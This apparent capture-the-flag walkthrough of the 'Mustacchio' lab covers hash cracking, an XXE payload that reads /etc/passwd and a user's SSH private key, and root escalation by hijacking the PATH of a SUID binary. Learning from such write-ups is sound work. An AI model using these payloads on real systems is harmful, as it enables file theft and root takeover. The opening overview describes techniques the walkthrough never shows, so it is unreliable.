Room: [Mustacchio]() ONGOING TUTORIAL

Difficulty: Hard

Overview: In this room enumeration is very important, searching for subdomains, modify an exploit to take advantage of a chat program has well a MongoDb web interface. Find and crack hashes to compromise a Bolt CMS server till we privesc to root through cap_setuid+ep capabilities.

xxe enumeration privesc web

------------------------------------------------------------------------------------------------------------------------------------------------------------------

We can start our enumeration fase by running "nmap". It will scan for all open ports on the target system:

```
nmap -sV -sC -p- mustacchio.thm -oN nmap.txt

mustacchio.thm → you can add the ip of the room to /etc/hosts

-Pn → To bypass the blocking of ping probes   

-sV → To determine service/version info

-p-  →  Scan all ports

-oN → Save scan to a file
```

![nmap](https://user-images.githubusercontent.com/76821053/186257404-a5196013-3e31-4a6b-9c30-10db5ce6c027.png)

There are three open ports:

22     →  ssh OpenSSH 7.2p2

80     →  http Apache httpd 2.4.18

8765   →  http nginx 1.10.3

Port 80 hosts a http web server:

![website80](https://user-images.githubusercontent.com/76821053/186258496-eed09ad7-fb11-4263-af26-369b744af45f.png)

To search for any hidden directories or files we can use “Gobuster”:

```
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --url http://mustacchio.thm/ -x .txt,.cgi,.php,.log,.bak,.xxx,.old

dir             → for directory brute-force

--wordlist   → Path of the wordlist

--url           →  Specify the url path

-x              → File extensions to search for
```

![gobuster](https://user-images.githubusercontent.com/76821053/186258583-84e51d26-ff8c-446b-86bd-00246df49f6b.png)

We can start browsing the directories found by “gobuster” to see what we can find.

There is a robots.txt file but it is empty:

![robotstxt](https://user-images.githubusercontent.com/76821053/186258725-8fc63b98-3754-43af-a627-7d30f4f90a5e.png)

At /custom/js path there is an interesting file called users.bak:

![usersbak](https://user-images.githubusercontent.com/76821053/186259309-68a79b6f-4a2f-449b-9468-a1d746807f71.png)

After downloading the file we can see that it holds some credentials but we need to use strings to be able to read it:

![strings](https://user-images.githubusercontent.com/76821053/186259376-a34e8467-5b75-46e9-898d-098dbda16fe4.png)

This credentials are from a sql database, they are encrypted. Braking down the credentials we can try to assume that “admin” is the username and the rest of the hash is the encrypted password.

Like so:

admin:1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

So using “hash-identifier” we can identify the encryption type:

![hashidentifier](https://user-images.githubusercontent.com/76821053/186259480-5f22283a-efc4-4950-b07a-11f5c8dbf023.png)

Knowing the encryption type we can use “John the ripper” to crack this password:

First we put the hash inside a file and pass it to john.

![echo](https://user-images.githubusercontent.com/76821053/187069045-30488c9f-cccf-4a24-b7fb-dcc5d715b658.png)

```
john user_hash --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt 
```

![john](https://user-images.githubusercontent.com/76821053/187069091-a4f85304-5a34-46b7-bf1d-8ab23bcae78f.png)

Credentials:

admin:bulldog19

If we take a look at the nginx http server we will find a login page that will accept our credentials:

![adminpanel](https://user-images.githubusercontent.com/76821053/187069121-cae89068-678b-43f6-9963-90c579f76cd8.png)

We have arrived at the admin panel and there is only a field where we are suppose to add comments on the website:

![adminpanelcoment](https://user-images.githubusercontent.com/76821053/187069152-43ff03fb-c541-4fd5-b923-bb5ac3f67c44.png)

Taking a closer look at the source code of the page we find how the javacript for the input field works:

![sourcecode](https://user-images.githubusercontent.com/76821053/187069180-406872f2-217e-4f81-9f65-e64c0dd8c7c5.png)

This submition input field accepts XML code, knowing this we can check for XXE vulnerabilities in this page.

XXE or XML External Entity attack is a type of attack against an application that parses XML input, for more information take a look at [owasp.org](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing).

We can use this payloads from githubs [PayloadAlltheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) 

![classicXXE](https://user-images.githubusercontent.com/76821053/187069231-64891bfc-f25b-4906-ad52-0c1fa71d641a.png)

But for it to work i adapted the XML code a bit for this webpage. What called my attention for this was a funny XML code found inside the source code, at “Example=/auth/dontforget.bak":

If we download the file we can see the structure of the XML.

![catdontforget](https://user-images.githubusercontent.com/76821053/187069432-a4fe7e02-5fbd-43f1-bcf0-67ca5ee7f253.png)

Knowing this our XML code would look like this:

```bash
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY file SYSTEM "file:///etc/passwd">]>
<comment>
  <name>Joe Hamd</name>
  <author></author>
  <com>&file;</com>
</comment>
```

Has we can see below this XML format worked, we recieved the content of /etc/passwd.

![XMLformat](https://user-images.githubusercontent.com/76821053/187069519-f5f207e4-2937-44e2-9bfe-d7cf4daea789.png)

The source code of the page had a message for “Barry”, saying that we could connect through ssh with his key. If we try connecting to ssh with “Barry” we will revice a message saying “Permission denied (publickey).”

![sshbarry](https://user-images.githubusercontent.com/76821053/187069545-cc7e4d6c-68ea-4e5e-a5d4-55d57539a363.png)

This means that we can only connect to ssh with a ssh key. 

The ssh keys are normally stored at "/home/user/.ssh". We can use the same XML code to extract the keys from "barry" home directory just by change the path of file.

![rsaprivatekey](https://user-images.githubusercontent.com/76821053/187069625-728ce5da-e996-4d63-be31-6b21db0fa18d.png)

After arranging the ssh key like so:

![catidrsa](https://user-images.githubusercontent.com/76821053/187069652-1dac5b09-d086-4338-a40a-6ade9a99e68c.png)

We need to crack it with “John the ripper”. And to do so we first need to use "ssh2john":

![crackwithjohn](https://user-images.githubusercontent.com/76821053/187069700-e7ce8f9d-0e8b-496d-ac5e-f52d6614d1a8.png)

With the id_rsa key and the passprase that we crack we can now ssh to the target machine.

But first we need to change the permissions of the id_rsa file:

![chmod600](https://user-images.githubusercontent.com/76821053/187069748-967824c3-84e7-4d54-86d7-d90516989a13.png)

We are in!

![sshidrsa](https://user-images.githubusercontent.com/76821053/187069757-94342d39-8af8-430b-b4e0-94c37eff5128.png)

We can find the first flag at “Barry's” home directory:

![firstflag](https://user-images.githubusercontent.com/76821053/187069874-73e62b4d-0fc3-472f-a2f0-755574b38ca0.png)

barry: urieljames

Knowing the path to the user.txt file we could also get it through the website:

![firstflagwebsite](https://user-images.githubusercontent.com/76821053/187069983-035c1bb0-85a6-4d30-ab66-91e81e90887c.png)

When starting enumerating the machine, one of the first things we can do is search for SUID binaries:

```bash
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
find / -uid 0 -perm -4000 -type f 2>/dev/null
```

![findperm](https://user-images.githubusercontent.com/76821053/187070125-6a6d521e-a92a-458c-9d95-d60a98732042.png)

Running the binary we will get a live feed of the nginx access.log file:

![accesslog](https://user-images.githubusercontent.com/76821053/187070148-1e98d600-9f1f-4db4-a376-8eb6542cd680.png)

If we look at the binary permissions we can read it, and to so we can use “strings”:

![strings2](https://user-images.githubusercontent.com/76821053/187070186-980a037e-2ff3-4a79-a295-faca0be13161.png)

“live_log” file is using “tail” to read the “access.log”, but it is not using the full PATH.

PATH is an environmental variable in Linux which contains all bin and sbin directories that hold all executable programs.

So we'll create a new “tail” binary that runs “/bin/bash”, this way we can try to hijack the PATH of “tail” to a specific directory and when the SUID binary with root privileges run it will trigger our new “tail” binary.

We can use these steps:

```bash
cd /tmp
echo '/bin/bash' > tail
chmod 777 tail
export PATH=/tmp:$PATH
```

The PATH for tails was:

![wich](https://user-images.githubusercontent.com/76821053/187070408-05257237-a503-4b7a-9be2-6fdfd943c453.png)

The new PATH is now /tmp/tail, and we just have to run the SUID binary “live_log” owned by root.

![runsuidbinary](https://user-images.githubusercontent.com/76821053/187070505-06172146-60d6-42b9-80dd-c4bf4a3899df.png)

Success! Root privileges!!

You can find the last flag at /root.

![rootflag](https://user-images.githubusercontent.com/76821053/187070539-e9035ee4-85a2-46bc-bed7-30d89f8b2a45.png)






























































